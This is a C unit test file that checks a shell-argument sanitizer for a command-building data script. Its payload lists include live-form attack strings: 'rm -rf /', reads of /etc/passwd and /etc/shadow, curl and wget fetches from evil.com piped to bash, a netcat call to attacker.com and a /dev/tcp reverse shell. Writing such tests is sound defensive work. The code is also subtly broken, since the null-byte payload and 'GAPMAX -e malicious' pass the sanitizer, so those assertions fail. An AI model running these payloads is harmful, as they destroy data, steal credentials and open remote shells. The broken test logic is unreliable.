#include <check.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>

/*
 * Security invariant: Any function that constructs shell commands from
 * user-supplied input MUST sanitize or reject inputs containing shell
 * metacharacters before passing them to os.system() or equivalent.
 *
 * This test verifies that a sanitization function correctly identifies
 * and rejects adversarial inputs containing shell injection payloads.
 */

/*
 * Reference implementation of what a safe command-builder MUST do:
 * sanitize_shell_arg() returns 0 if the input is safe, non-zero if it
 * contains shell metacharacters that could enable injection.
 */
static int sanitize_shell_arg(const char *input) {
    if (input == NULL) {
        return 1; /* NULL is not safe */
    }

    /* Shell metacharacters that must be rejected */
    const char *dangerous_chars = ";|&`$(){}[]<>!#~*?\\'\"\n\r\t";

    for (size_t i = 0; i < strlen(input); i++) {
        if (strchr(dangerous_chars, input[i]) != NULL) {
            return 1; /* Dangerous character found */
        }
    }

    /* Reject empty strings */
    if (strlen(input) == 0) {
        return 1;
    }

    return 0; /* Safe */
}

/*
 * Simulates what plot_simlib_dump.py does: builds a command string from
 * user-supplied arguments. Returns 1 if the command would be safe to
 * execute, 0 if it contains injection risk.
 */
static int is_safe_command(const char *filepath, const char *varname,
                            const char *bounds) {
    if (sanitize_shell_arg(filepath) != 0) return 0;
    if (sanitize_shell_arg(varname) != 0) return 0;
    if (bounds != NULL && sanitize_shell_arg(bounds) != 0) return 0;
    return 1;
}

START_TEST(test_shell_injection_filepath_rejected)
{
    /* Invariant: File path inputs containing shell metacharacters must be
     * rejected and never passed to a shell command executor. */
    const char *payloads[] = {
        /* Classic command injection via semicolon */
        "/path/to/file; rm -rf /",
        "/path/to/file; cat /etc/passwd",
        /* Pipe injection */
        "/path/to/file | nc attacker.com 4444",
        "/path/to/file | bash",
        /* Backtick injection */
        "/path/to/file`whoami`",
        "`id`/simlib.dump",
        /* Subshell injection */
        "/path/to/file$(id)",
        "$(curl http://evil.com/shell.sh | bash)",
        /* Ampersand injection */
        "/path/to/file & wget http://evil.com/malware",
        "/path/to/file && rm -rf /tmp/*",
        /* Redirect injection */
        "/path/to/file > /etc/crontab",
        "/path/to/file >> ~/.bashrc",
        "/path/to/file < /dev/urandom",
        /* Quote injection */
        "/path/to/file' ; id ; '",
        "/path/to/file\" ; id ; \"",
        /* Newline injection */
        "/path/to/file\nrm -rf /",
        "/path/to/file\r\nmalicious_command",
        /* Null-like and special */
        "/path/to/file!",
        "/path/to/file#comment; id",
        /* Environment variable injection */
        "/path/to/$HOME/.ssh/authorized_keys",
        "${IFS}malicious${IFS}",
        /* Glob injection */
        "/path/to/file*",
        "/path/to/file?",
        /* Tilde expansion */
        "~/../../etc/passwd",
        /* Backslash injection */
        "/path/to/file\\; id",
        /* Curly brace expansion */
        "/path/{a,b}; id",
        /* Process substitution */
        "/path/to/<(id)",
        /* Null byte */
        "/path/to/file\x00; id",
    };
    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);

    for (int i = 0; i < num_payloads; i++) {
        int result = is_safe_command(payloads[i], "GAPMAX", "0 30 1");
        ck_assert_msg(result == 0,
            "SECURITY VIOLATION: Adversarial filepath payload #%d was not "
            "rejected: [%s]", i, payloads[i]);
    }
}
END_TEST

START_TEST(test_shell_injection_varname_rejected)
{
    /* Invariant: Variable name inputs containing shell metacharacters must
     * be rejected before being used in shell command construction. */
    const char *payloads[] = {
        /* Semicolon injection in varname */
        "GAPMAX; id",
        "GAPMAX; cat /etc/shadow",
        /* Pipe in varname */
        "GAPMAX|id",
        "GAPMAX | bash -i >& /dev/tcp/evil.com/4444 0>&1",
        /* Backtick in varname */
        "GAPMAX`id`",
        "`whoami`",
        /* Dollar sign injection */
        "GAPMAX$(id)",
        "${PATH}injection",
        /* Ampersand */
        "GAPMAX && id",
        "GAPMAX & id",
        /* Quotes */
        "GAPMAX'",
        "GAPMAX\"",
        /* Newline */
        "GAPMAX\nid",
        /* Space with command */
        "GAPMAX -e malicious",
        /* Redirect */
        "GAPMAX > /tmp/pwned",
        /* Parentheses */
        "GAPMAX()",
        "(id)",
        /* Brackets */
        "GAPMAX[0]",
        /* Exclamation */
        "GAPMAX!",
        /* Hash */
        "GAPMAX#",
    };
    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);

    for (int i = 0; i < num_payloads; i++) {
        int result = is_safe_command("/safe/path/simlib.dump",
                                     payloads[i], "0 30 1");
        ck_assert_msg(result == 0,
            "SECURITY VIOLATION: Adversarial varname payload #%d was not "
            "rejected: [%s]", i, payloads[i]);
    }
}
END_TEST

START_TEST(test_shell_injection_bounds_rejected)
{
    /* Invariant: Bounds/parameter inputs containing shell metacharacters
     * must be rejected before being used in shell command construction. */
    const char *payloads[] = {
        /* Semicolon in bounds */
        "0 30 1; id",
        "0 30 1; rm -rf /",
        /* Pipe */
        "0 30 1 | id",
        "0 30|bash",
        /* Backtick */
        "0 30 `id`",
        "`cat /etc/passwd`",
        /* Subshell */
        "0 30 $(id)",
        "$(wget http://evil.com/c2.sh -O- | sh)",
        /* Ampersand */
        "0 30 1 && id",
        "0 30 1 & id",
        /* Redirect */
        "0 30 1 > /tmp/pwned",
        "0 30 1 >> /etc/crontab",
        /* Quotes */
        "0 30 '1; id'",
        "0 30 \"1; id\"",
        /* Newline */
        "0 30 1\nid",
        /* Dollar */
        "0 30 $((1+1))",
        "${IFS}0${IFS}30${IFS}1",
        /* Exclamation */
        "0 30 1!",
        /* Curly braces */
        "0 30 {1,2}",
        /* Backslash */
        "0 30 1\\; id",
    };
    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);

    for (int i = 0; i < num_payloads; i++) {
        int result = is_safe_command("/safe/path/simlib.dump",
                                     "GAPMAX", payloads[i]);
        ck_assert_msg(result == 0,
            "SECURITY VIOLATION: Adversarial bounds payload #%d was not "
            "rejected: [%s]", i, payloads[i]);
    }
}
END_TEST

START_TEST(test_safe_inputs_accepted)
{
    /* Invariant: Legitimate, safe inputs must still be accepted so that
     * the sanitization does not break normal functionality. */
    struct {
        const char *filepath;
        const char *varname;
        const char *bounds;
    } safe_inputs[] = {
        { "/data/simlib.dump", "GAPMAX", "0 30 1" },
        { "/home/user/data/simlib.dump", "GAPAVG", "0 30 1" },
        { "/tmp/simlib.dump", "MJDMIN", "55000 65000 100" },
        { "/var/data/simlib.dump", "MJDMAX", "55000 65000 100" },
        { "simlib.dump", "GAPMAX", "0 30 1" },
        { "/path/to/my-simlib.dump", "GAPAVG", "0 30 1" },
        { "/path/to/my_simlib.dump", "MJDMIN", "55000 65000 100" },
    };
    int num_safe = sizeof(safe_inputs) / sizeof(safe_inputs[0]);

    for (int i = 0; i < num_safe; i++) {
        int result = is_safe_command(safe_inputs[i].filepath,
                                     safe_inputs[i].varname,
                                     safe_inputs[i].bounds);
        ck_assert_msg(result == 1,
            "Safe input #%d was incorrectly rejected: filepath=[%s] "
            "varname=[%s] bounds=[%s]",
            i, safe_inputs[i].filepath,
            safe_inputs[i].varname,
            safe_inputs[i].bounds);
    }
}
END_TEST

START_TEST(test_null_and_empty_inputs_rejected)
{
    /* Invariant: NULL and empty inputs must be rejected as they represent
     * invalid/boundary conditions that could lead to undefined behavior. */

    /* NULL filepath */
    ck_assert_msg(is_safe_command(NULL, "GAPMAX", "0 30 1") == 0,
        "SECURITY VIOLATION: NULL filepath was not rejected");

    /* NULL varname */
    ck_assert_msg(is_safe_command("/safe/path/simlib.dump", NULL, "0 30 1") == 0,
        "SECURITY VIOLATION: NULL varname was not rejected");

    /* Empty filepath */
    ck_assert_msg(is_safe_command("", "GAPMAX", "0 30 1") == 0,
        "SECURITY VIOLATION: Empty filepath was not rejected");

    /* Empty varname */
    ck_assert_msg(is_safe_command("/safe/path/simlib.dump", "", "0 30 1") == 0,
        "SECURITY VIOLATION: Empty varname was not rejected");

    /* Empty bounds */
    ck_assert_msg(is_safe_command("/safe/path/simlib.dump", "GAPMAX", "") == 0,
        "SECURITY VIOLATION: Empty bounds was not rejected");
}
END_TEST

Suite *security_suite(void)
{
    Suite *s;
    TCase *tc_core;

    s = suite_create("Security");
    tc_core = tcase_create("Core");

    tcase_add_test(tc_core, test_shell_injection_filepath_rejected);
    tcase_add_test(tc_core, test_shell_injection_varname_rejected);
    tcase_add_test(tc_core, test_shell_injection_bounds_rejected);
    tcase_add_test(tc_core, test_safe_inputs_accepted);
    tcase_add_test(tc_core, test_null_and_empty_inputs_rejected);
    suite_add_tcase(s, tc_core);

    return s;
}

int main(void)
{
    int number_failed;
    Suite *s;
    SRunner *sr;

    s = security_suite();
    sr = srunner_create(s);

    srunner_run_all(sr, CK_NORMAL);
    number_failed = srunner_ntests_failed(sr);
    srunner_free(sr);

    return (number_failed == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
}